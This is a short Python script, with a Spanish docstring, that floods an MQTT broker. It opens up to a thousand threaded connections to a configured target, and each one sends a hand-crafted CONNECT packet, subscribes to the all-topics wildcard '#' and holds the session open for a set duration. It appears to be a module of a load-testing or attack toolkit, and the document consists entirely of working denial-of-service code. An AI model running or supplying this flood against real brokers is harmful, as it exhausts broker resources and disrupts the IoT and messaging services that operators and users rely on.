"""MQTT subscribe flood — abre N conexiones, todas se suscriben a #."""

from __future__ import annotations

import socket
import struct
import threading
import time


def _client(target: tuple[str, int], stop_at: float) -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect(target)
        # CONNECT
        cid = f"flood-{time.time_ns() & 0xffff}".encode()
        var = b"\x00\x04MQTT" + b"\x04" + b"\x02" + b"\x00\x3c"
        payload = struct.pack(">H", len(cid)) + cid
        rem = var + payload
        s.sendall(b"\x10" + bytes([len(rem)]) + rem)
        s.recv(4)  # CONNACK

        # SUBSCRIBE a "#"
        topic = b"#"
        sub = struct.pack(">H", 1) + struct.pack(">H", len(topic)) + topic + b"\x00"
        s.sendall(b"\x82" + bytes([len(sub)]) + sub)
        while time.time() < stop_at:
            time.sleep(1)
    except OSError:
        return
    finally:
        s.close()


def run(cfg: dict) -> int:
    target = (cfg["target_ip"], cfg["target_port"])
    end = time.time() + cfg["duration_s"]
    threads = []
    for _ in range(cfg.get("sockets", 1000)):
        t = threading.Thread(target=_client, args=(target, end), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.005)
    for t in threads:
        t.join(timeout=cfg["duration_s"] + 5)
    return 0
